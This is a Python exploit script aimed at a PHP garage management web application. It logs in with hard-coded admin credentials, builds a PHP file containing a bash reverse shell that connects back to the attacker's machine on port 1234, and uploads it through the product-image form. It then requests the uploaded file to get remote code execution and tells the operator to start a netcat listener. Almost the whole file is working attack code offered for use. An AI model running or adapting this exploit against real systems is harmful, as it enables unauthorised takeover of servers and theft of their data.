import requests, string, sys, warnings, time, concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from netifaces import interfaces, ifaddresses, AF_INET

req = requests.Session()

def login(ip,username,password):  
    target = "http://%s/garage/garage/login.php" %ip
    data = {'username':username,'password':password, 'login':''}
    response = req.post(target, data=data)

    if 'Login Successfully' in response.text:
        print("[$] Success Login :)")
        trigger_rce(req)
    else:
        print("[$] Failed Login :(")

def creata_rs():
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        if ifaceName=="eth0":
            ipadd = ' '.join(addresses)
            f = open("saitamang.php", "w")
            payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+str(ipadd)+"/1234 0>&1'\")?>"
            f.write(payload)
            f.close()
        else:
            pass

def trigger_rce(req):
    creata_rs()
    target = "http://%s/garage/garage/php_action/createProduct.php" %ip
    starttime = int(time.time())
    multipart_form_data = {
    "currnt_date": (None,""),
    "productImage": ("saitamang.php", open("saitamang.php", "rb")),
    "productName" : (None,"test"),
    "quantity" : (None,"1"),
    "rate" : (None,"1"),
    "brandName" : (None,"1"),
    "categoryName" : (None,"1"),
    "productStatus" : (None,"1"),
    "create" : (None,"")
    }
    response = req.post(target, files=multipart_form_data)
    print("[$] Enjoy your RCE :)")
    req.get("http://%s/garage/garage/assets/myimages/saitamang.php" %ip)


if __name__ == "__main__":
    print("   _____       _ __                                   ")
    print("  / ___/____ _(_) /_____ _____ ___  ____ _____  ____ _")
    print("  \__ \/ __ `/ / __/ __ `/ __ `__ \/ __ `/ __ \/ __ `/")
    print(" ___/ / /_/ / / /_/ /_/ / / / / / / /_/ / / / / /_/ / ")
    print("/____/\__,_/_/\__/\__,_/_/ /_/ /_/\__,_/_/ /_/\__, /  ")
    print("                                             /____/   \n\n")
    
    try:
        ip = sys.argv[1].strip()

        username = "mayuri.infospace@gmail.com"
        password = "rootadmin"

        login(ip,username,password)
        
    except IndexError:
        print("[-] Usage %s <ip>" % sys.argv[0])
        print("[-] Example: %s 192.168.100.x" % sys.argv[0])
        print("[-] Kindly setup your netcat listernet to port 1234")
        print("nc -lvp 1234")
    sys.exit(-1)
